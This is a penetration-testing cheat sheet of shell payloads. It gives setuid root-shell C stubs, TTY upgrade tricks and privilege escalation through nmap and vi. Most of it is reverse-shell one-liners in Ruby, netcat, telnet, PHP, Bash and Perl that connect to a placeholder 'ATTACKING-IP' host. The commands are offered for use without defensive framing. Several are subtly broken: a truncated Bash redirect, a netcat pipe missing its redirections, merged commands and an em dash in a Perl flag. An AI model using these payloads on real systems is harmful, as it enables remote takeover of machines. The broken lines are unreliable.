# Shells & Reverse Shells

## **Shells & Reverse Shells**

-   bin/bash:
	```c
	int main(void){

	setresuid(0, 0, 0);

	system("/bin/bash");

	}
	```
	
	-   bin/sh:
	```c
	int main(void){

	setresuid(0, 0, 0);

	system("/bin/sh");

	}
	```


## **TTY Shell:**

```sql
python -c 'import pty;pty.spawn("/bin/bash")'
```

```sql
echo os.system('/bin/bash')
```

-   LUA
	```sql
	execute('/bin/sh')
	```

-   Privilege Escalation via nmap
	```sql
	!sh
	```
	
-   Privilege Escalation via vi
	```sql
	:!bash
	```


## Fully Interactive TTY
```sql

						 	In reverse shell 
python -c 'import pty; pty.spawn("/bin/bash")'Ctrl-Z                                

						  	In Attacker console
stty -a
stty raw -echo
fg                            

							In reverse shell
resetexport SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>

```

```sql

						 	In reverse shell 
script /dev/null -c bash Ctrl-Z                                

						  	In Attacker console
stty raw -echo; fg                            

							In reverse shell
reset
Terminal type?: xterm 
export TERM=xterm
export shell=bash 
stty rows 52
```

## **Spawn Ruby Shell**
 
```sql
exec "/bin/sh"
```

```sql
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh-i<&%d >&%d 2>&%d",f,f,f)'
```


## **Netcat**

```sql
nc -e /bin/sh ATTACKING-IP 80
```

```sql
/bin/sh | nc ATTACKING-IP 80
```

```sql
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```


## **Telnet Reverse Shell**

```sql
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
```

```sql
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```


## **PHP**
-   (Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)
	```sql
	php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
	```


## **Bash**

```sql
exec /bin/bash 0&0 2>&0
```

```sql
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
```

```sql
exec 5<>/dev/tcp/ATTACKING-IP/80 cat <&5 | while read line; do $line 2>&5 >&5; done
```

```sql
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&
```


## **Perl**

```perl
    exec "/bin/sh";
```

```sql
perl —e 'exec "/bin/sh";'
```

```sql
    perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- Windows
	```sql
	perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
	```

- Windows
	```sql
	perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	```
